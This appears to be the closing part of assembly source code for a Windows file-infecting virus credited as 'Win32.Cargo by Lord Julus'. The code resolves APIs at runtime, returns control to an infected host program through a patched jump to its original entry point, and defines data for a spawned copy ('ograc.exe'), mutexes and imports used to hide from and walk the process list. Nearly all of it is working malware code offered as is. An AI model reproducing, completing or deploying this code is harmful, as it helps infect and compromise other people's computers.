;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; General module retriving routine
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;
; Entry:  EDI = pointer to module name
;
; Return: EAX = module base address if success
;         EAX = 0, CF set if fail

LocateModuleBase proc near                         ;
       pushad                                      ; save regs
       push edi                                    ; push name
       call dword ptr [ebp+_GetModuleHandleA]      ; call GetModuleHandleA
       mov dr0, eax                                ;
       popad                                       ;
       mov eax, dr0                                ;
       or eax, eax                                 ;
       jz notfoundmodule                           ;
       clc                                         ; success
       ret                                         ;
                                                   ;
notfoundmodule:                                    ;
       stc                                         ; fail
       ret                                         ;
LocateModuleBase endp                              ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; General API address retriving routine
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;
; Entry:  EAX = base address of the module
;         EBX = address of GetProcAddress
;         EDI = pointer to api names list (each item null terminated,
;                                          list terminated with 0FFh)
;         ESI = pointer to api addresses list
;
; Return: CF clear if success and list at ESI filled with API addresses
;         CF set if fail

LocateApiAddresses proc near                       ;
       pushad                                      ; save all regs
       mov edx, eax                                ; save module base
locate_apis_loop:                                  ;
       cmp byte ptr [edi], 0FFh                    ; is it the end?
       je ready_apis                               ;
                                                   ;
       push edx                                    ; save base
       push edi                                    ; push api name
       push edx                                    ; push module base
       call ebx                                    ; call GetProcAddress
       pop edx                                     ; restore module base
       or eax, eax                                 ; error?
       je error_finding_apis                       ;
                                                   ;
       mov dword ptr [esi], eax                    ; save api address
                                                   ;
       mov ecx, 100h                               ; look for the next
       mov al, 0                                   ; api name
       repnz scasb                                 ;
                                                   ;
       add esi, 4                                  ; increment array
       jmp locate_apis_loop                        ;
                                                   ;
ready_apis:                                        ;
       popad                                       ; all ok!
       clc                                         ;
       ret                                         ;
                                                   ;
error_finding_apis:                                ;
       popad                                       ; error here...
       stc                                         ;
       ret                                         ;
LocateApiAddresses endp                            ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; Here we return to the host process or exit if first generation
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

exit proc near                                     ;
       jmp restore_seh                             ;
                                                   ;
ExceptionExit:                                     ; if we had an error we
       mov esp, [esp+8]                            ; must restore the ESP
                                                   ;
restore_seh:                                       ;
       pop dword ptr fs:[0]                        ; and restore the SEH
       add esp, 4                                  ; returning to the host...
                                                   ;
       or ebp, ebp                                 ; is it generation 0?
       je generation0_exit                         ;
                                                   ;
       popad                                       ;
                                                   ;
       push edi                                    ; temporary save edi
       db 0bfh                                     ; put delta in edi
delta  dd 0                                        ;
                                                   ;
       cmp edi, 0                                  ; first generation ?
       je generation0_exit                         ;
       mov eax, [edi+offset oldeip]                ; restore old EIP
       add eax, [edi+offset imagebase]             ; align to memory
       push eax                                    ;
       push ebx                                    ;
       lea ebx, [edi+offset jump]                  ; calculate the length of
       sub eax, ebx                                ; the jump to the host
       sub eax, 4                                  ;
       mov dword ptr [edi+jump], eax               ; and store the jump!
       pop ebx                                     ; restore the last regs...
       pop eax                                     ;
       pop edi                                     ;
                                                   ;
       db 0e9h                                     ; this is JMP Original EIP
jump   dd 0                                        ;
                                                   ;
generation0_exit:                                  ; exit from generation 0
       popad                                       ;
       push 0                                      ;
       call ExitProcess                            ;
exit endp                                          ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; Equates, structures, data
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

IMAGE_DOS_HEADER STRUC           ; DOS .EXE header
MZ_magic         DW ?            ; Magic number
MZ_cblp          DW ?            ; Bytes on last page of file
MZ_cp            DW ?            ; Pages in file
MZ_crlc          DW ?            ; Relocations
MZ_cparhdr       DW ?            ; Size` of header in paragraphs
MZ_minalloc      DW ?            ; Minimum extra paragraphs needed
MZ_maxalloc      DW ?            ; Maximum extra paragraphs needed
MZ_ss            DW ?            ; Initial (relative) SS value
MZ_sp            DW ?            ; Initial SP value
MZ_csum          DW ?            ; Checksum
MZ_ip            DW ?            ; Initial IP value
MZ_cs            DW ?            ; Initial (relative) CS value
MZ_lfarlc        DW ?            ; File address of relocation table
MZ_ovno          DW ?            ; Overlay number
MZ_res           DW 4 DUP(?)     ; Reserved words
MZ_oemid         DW ?            ; OEM identifier (for MZ_oeminfo)
MZ_oeminfo       DW ?            ; OEM information; MZ_oemid specific
MZ_res2          DW 10 DUP(?)    ; Reserved words
MZ_lfanew        DD ?            ; File address of new exe header
IMAGE_DOS_HEADER ENDS            ;
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
                                 ;
IMAGE_FILE_HEADER STRUC          ; Portable Exe File
PE_Magic                 DD ?    ;
Machine                  DW ?    ; Machine type
NumberOfSections         DW ?    ; Number of sections
TimeDateStamp            DD ?    ; Date and Time
PointerToSymbolTable     DD ?    ; Pointer to Symbols
NumberOfSymbols          DD ?    ; Number of Symbols
SizeOfOptionalHeader     DW ?    ; Size of Optional Header
Characteristics          DW ?    ; File characteristics
IMAGE_FILE_HEADER ENDS           ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER
                                 ;
IMAGE_DATA_DIRECTORY STRUC       ; Image data directory
DD_VirtualAddress    DD ?        ; Virtual address
DD_Size              DD ?        ; Virtual size
IMAGE_DATA_DIRECTORY ENDS        ;;;;;;;;;
                                         ;
IMAGE_DIRECTORY_ENTRIES STRUC            ; All directories
DE_Export       IMAGE_DATA_DIRECTORY  ?  ;
DE_Import       IMAGE_DATA_DIRECTORY  ?  ;
DE_Resource     IMAGE_DATA_DIRECTORY  ?  ;
DE_Exception    IMAGE_DATA_DIRECTORY  ?  ;
DE_Security     IMAGE_DATA_DIRECTORY  ?  ;
DE_BaseReloc    IMAGE_DATA_DIRECTORY  ?  ;
DE_Debug        IMAGE_DATA_DIRECTORY  ?  ;
DE_Copyright    IMAGE_DATA_DIRECTORY  ?  ;
DE_GlobalPtr    IMAGE_DATA_DIRECTORY  ?  ;
DE_TLS          IMAGE_DATA_DIRECTORY  ?  ;
DE_LoadConfig   IMAGE_DATA_DIRECTORY  ?  ;
DE_BoundImport  IMAGE_DATA_DIRECTORY  ?  ;
DE_IAT          IMAGE_DATA_DIRECTORY  ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS             ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16    ;
                                         ;;;;;;;;;;;
IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
OH_Magic                        DW ?           ; Magic word
OH_MajorLinkerVersion           DB ?           ; Major Linker version
OH_MinorLinkerVersion           DB ?           ; Minor Linker version
OH_SizeOfCode                   DD ?           ; Size of code section
OH_SizeOfInitializedData        DD ?           ; Initialized Data
OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
OH_ImageBase                    DD BYTE PTR ?  ; Base of image
OH_SectionAlignment             DD ?           ; Section Alignment
OH_FileAlignment                DD ?           ; File Alignment
OH_MajorOperatingSystemVersion  DW ?           ; Major OS
OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
OH_MajorImageVersion            DW ?           ; Major Image version
OH_MinorImageVersion            DW ?           ; Minor Image version
OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
OH_Win32VersionValue            DD ?           ; win32 version
OH_SizeOfImage                  DD ?           ; Size of image
OH_SizeOfHeaders                DD ?           ; Size of Header
OH_CheckSum                     DD ?           ; unused
OH_Subsystem                    DW ?           ; Subsystem
OH_DllCharacteristics           DW ?           ; DLL characteristic
OH_SizeOfStackReserve           DD ?           ; Stack reserve
OH_SizeOfStackCommit            DD ?           ; Stack commit
OH_SizeOfHeapReserve            DD ?           ; Heap reserve
OH_SizeOfHeapCommit             DD ?           ; Heap commit
OH_LoaderFlags                  DD ?           ; Loader flags
OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                UNION          ; directory entries
OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                ENDS           ;
IMAGE_OPTIONAL_HEADER ENDS                     ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
                                               ;
IMAGE_SECTION_HEADER STRUC                     ; Section hdr.
SH_Name                 DB 8 DUP(?)            ; name
                        UNION                  ;
SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
SH_VirtualSize          DD ?                   ; Virtual size
                        ENDS                   ;
SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
SH_SizeOfRawData        DD ?                   ; Raw data size
SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
SH_PointerToRelocations DD BYTE PTR ?          ; ...
SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
SH_NumberOfRelocations  DW ?                   ; ....
SH_NumberOfLinenumbers  DW ?                   ; ..
SH_Characteristics      DD ?                   ; flags
IMAGE_SECTION_HEADER ENDS                      ;
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
                                            ;
IMAGE_IMPORT_BY_NAME STRUC                  ; Import by name data type
IBN_Hint DW 0                               ; Hint entry
IBN_Name DB 1 DUP (?)                       ; name
IMAGE_IMPORT_BY_NAME ENDS                   ;
                                            ;
IMAGE_THUNK_DATA STRUC                      ; Thunk data
                    UNION                   ;
TD_AddressOfData    DD IMAGE_IMPORT_BY_NAME PTR ? ; Ptr to IMAGE_IMPORT_BY_NAME structure
TD_Ordinal          DD ?                    ; Ordinal ORed with IMAGE_ORDINAL_FLAG
TD_Function         DD BYTE PTR ?           ; Ptr to function (i.e. Function address after program load)
TD_ForwarderString  DD BYTE PTR ?           ; Ptr to a forwarded API function.
                    ENDS                    ;
IMAGE_THUNK_DATA ENDS               ;;;;;;;;;
                                    ;
IMAGE_IMPORT_DESCRIPTOR STRUC       ; Import descryptor
                      UNION         ;
ID_Characteristics    DD ?          ; 0 for last null import descriptor
ID_OriginalFirstThunk DD IMAGE_THUNK_DATA PTR ? ; RVA to original unbound IAT
                      ENDS          ;
ID_TimeDateStamp      DD ?          ;
ID_ForwarderChain     DD ?          ; -1 if no forwarders
ID_Name               DD BYTE PTR ? ; RVA to name of imported DLL
ID_FirstThunk         DD IMAGE_THUNK_DATA PTR ?  ; RVA to IAT
IMAGE_IMPORT_DESCRIPTOR ENDS        ;
IMAGE_IMPORT_DESCRIPTOR_SIZE = SIZE IMAGE_IMPORT_DESCRIPTOR

IMAGE_EXPORT_DIRECTORY STRUC                ; Export Directory type
ED_Characteristics        DD ?              ; Flags
ED_TimeDateStamp          DD ?              ; Date / Time
ED_MajorVersion           DW ?              ; Major version
ED_MinorVersion           DW ?              ; Minor version
ED_Name                   DD    BYTE PTR ?  ; Ptr to name of exported DLL
                          UNION             ;
ED_Base                   DD    ?           ; base
ED_BaseOrdinal            DD    ?           ; base ordinal
                          ENDS              ;
ED_NumberOfFunctions      DD    ?           ; number of exported funcs.
                          UNION             ;
ED_NumberOfNames          DD    ?           ; number of exported names
ED_NumberOfOrdinals       DD    ?           ; number of exported ordinals
                          ENDS              ;
ED_AddressOfFunctions     DD    DWORD PTR ? ; Ptr to array of function addresses
ED_AddressOfNames         DD    DWORD PTR ? ; Ptr to array of (function) name addresses
                          UNION             ;
ED_AddressOfNameOrdinals  DD    WORD PTR ?  ; Ptr to array of name ordinals
ED_AddressOfOrdinals      DD    WORD PTR ?  ; Ptr to array of ordinals
                          ENDS              ;
IMAGE_EXPORT_DIRECTORY ENDS                 ;

filetime                STRUC             ; filetime structure
FT_dwLowDateTime        dd ?              ;
FT_dwHighDateTime       dd ?              ;
filetime                ENDS              ;
                                          ;
win32_find_data         STRUC             ;
FileAttributes          dd ?              ; attributes
CreationTime            filetime ?        ; time of creation
LastAccessTime          filetime ?        ; last access time
LastWriteTime           filetime ?        ; last modificationm
FileSizeHigh            dd ?              ; filesize
FileSizeLow             dd ?              ; -"-
Reserved0               dd ?              ;
Reserved1_              dd ?              ;
FileName                db 260 dup (?)    ; long filename
AlternateFileName       db 13 dup (?)     ; short filename
                        db 3 dup (?)      ; dword padding
win32_find_data         ENDS              ;
                                          ;
STARTUPINFO STRUC                         ; used by CreateProcess
    STI_cb              DD ?              ;
    STI_lpReserved      DD BYTE PTR ?     ;
    STI_lpDesktop       DD BYTE PTR ?     ;
    STI_lpTitle         DD BYTE PTR ?     ;
    STI_dwX             DD ?              ;
    STI_dwY             DD ?              ;
    STI_dwXSize         DD ?              ;
    STI_dwYSize         DD ?              ;
    STI_dwXCountChars   DD ?              ;
    STI_dwYCountChars   DD ?              ;
    STI_dwFillAttribute DD ?              ;
    STI_dwFlags         DD ?              ;
    STI_wShowWindow     DW ?              ;
    STI_cbReserved2     DW ?              ;
    STI_lpReserved2     DD BYTE PTR ?     ;
    STI_hStdInput       DD ?              ;
    STI_hStdOutput      DD ?              ;
    STI_hStdError       DD ?              ;
STARTUPINFO ENDS                          ;
                                          ;
PROCESS_INFORMATION STRUC                 ; Created by CreateProcess
    PI_hProcess    DD ?                   ;
    PI_hThread     DD ?                   ;
    PI_dwProcessId DD ?                   ;
    PI_dwThreadId  DD ?                   ;
PROCESS_INFORMATION ENDS                  ;
                                     ;;;;;;
PROCESSENTRY32 STRUC                 ;
    dwSize            DD 0           ; goddamn this... >:->
    cntUsage          DD 0           ;
    th32ProcessID     DD 0           ;
    th32DefaultHeapID DD 0           ;
    th32ModuleID      DD 0           ;
    cntThreads        DD 0           ;
    th32ParentProcessID DD 0         ;
    pcPriClassBase    DD 0           ;
    dwFlags           DD 0           ;
    szExeName DB 260  DUP(0)         ;
PROCESSENTRY32 ENDS                  ;
                                     ;
                                     ;
startupinfo   STARTUPINFO         ?  ;
processinfo   PROCESS_INFORMATION ?  ;
spawnname     db "ograc.exe",0,0     ; the name of the spawned copy
mutex         db "cargo",0           ; mutex 1
mutex2        db "ograc",0           ; mutex 2
newimagebase  label                  ;
imagebase     dd 00400000h           ; the image base
filehandle    dd 0                   ; filehandle
filealign     dd 0                   ; file alignment
nob           dd 0                   ; number of bytes
temp          dd 0                   ; temp variable
process32 PROCESSENTRY32 <size PROCESSENTRY32> ; our process32
t32h dd 0                            ; toolhelp snapshot handle
IF DEBUG                             ;
windowmessage db "Process closed: "  ;
file          db 260 dup(0)          ;
windowtitle db "Win32.Cargo by Lord Julus",0 ;
_name db 260 dup(?)                  ;
ENDIF                                ;
threadid dd 0                        ; new thread ID
hthread dd 0                         ; new thread handle
                                     ;
firstmemo  dd 0                      ; first array handle
secondmemo dd 0                      ; second array handle
firstsize  dd 0                      ; first array size
secondsize dd 0                      ; second array size
firstindex dd 0                      ; first index
secondindex dd 0                     ; second index
                                     ;
temp_mem_ptr dd 0                    ; temp
temp_mem_sze dd 0                    ; temp
                                     ;
flag         dd 0                    ; flags
error        dd 0                    ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

k32_names label
                           db        "ExitProcess",0
                           db        "CreateProcessA",0
                           db        "GetStartupInfoA",0
                           db        "GetCurrentProcess",0
                           db        "SetPriorityClass",0
                           db        "Sleep",0
                           db        "GetCommandLineA",0
                           db        "lstrlen",0
                           db        "CloseHandle",0
                           db        "CreateFileA",0
                           db        "CreateMutexA",0
                           db        "GetLastError",0
                           db        "IsBadReadPtr",0
                           db        "WriteFile",0
                           db        "SetFilePointer",0
                           db        "RegisterServiceProcess",0
                           db        "GetProcAddress",0
                           db        "GetModuleHandleA",0
                           db        "CreateToolhelp32Snapshot",0
                           db        "Process32First",0
                           db        "Process32Next",0
                           db        "CreateThread",0
                           db        "WaitForSingleObject",0
                           db        "ExitThread",0
                           db        "ResumeThread",0
                           db        "GlobalAlloc",0
                           db        "GlobalReAlloc",0
                           db        "GlobalFree",0
                           db        "lstrcpy",0
                           db        "SetThreadPriority",0
                           db        0FFh

k32_apis label
_ExitProcess               dd 0
_CreateProcessA            dd 0
_GetStartupInfoA           dd 0
_GetCurrentProcess         dd 0
_SetPriorityClass          dd 0
_Sleep                     dd 0
_GetCommandLineA           dd 0
_lstrlen                   dd 0
_CloseHandle               dd 0
_CreateFileA               dd 0
_CreateMutexA              dd 0
_GetLastError              dd 0
_IsBadReadPtr              dd 0
_WriteFile                 dd 0
_SetFilePointer            dd 0
_RegisterServiceProcess    dd 0
_GetProcAddress            dd 0
_GetModuleHandleA          dd 0
_CreateToolhelp32Snapshot  dd 0
_Process32First            dd 0
_Process32Next             dd 0
_CreateThread              dd 0
_WaitForSingleObject       dd 0
_ExitThread                dd 0
_ResumeThread              dd 0
_GlobalAlloc               dd 0
_GlobalReAlloc             dd 0
_GlobalFree                dd 0
_lstrcpy                   dd 0
_SetThreadPriority         dd 0

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

u32_names label
                           db        "MessageBoxA",0
                           db        "PeekMessageA",0
                           db        0FFh

u32_apis label
_MessageBoxA               dd 0
_PeekMessageA              dd 0

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

kernel32_name      db "KERNEL32.dll",0
user32_name        db "USER32.dll",0
k32                dd 0
u32                dd 0
getprocaddress     db "GetProcAddress",0
getprocaddresslen  = $-offset getprocaddress
getmodulehandle    db "GetModuleHandleA",0
getmodulehandlelen = $-offset getmodulehandle
oldeip             dd 0

end start
end

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
